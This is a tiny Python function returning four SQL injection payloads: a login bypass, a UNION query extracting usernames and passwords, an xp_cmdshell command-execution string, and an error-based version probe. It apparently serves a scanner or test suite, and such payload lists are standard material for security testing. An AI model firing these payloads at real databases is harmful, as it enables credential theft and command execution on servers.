def get_sqli_payloads():
    return [
        "' OR 1=1-- -",
        "' UNION SELECT username,password FROM users-- -",
        "'; EXEC xp_cmdshell('whoami')-- -",
        "' AND 1=CONVERT(int,@@version)-- -"
    ]
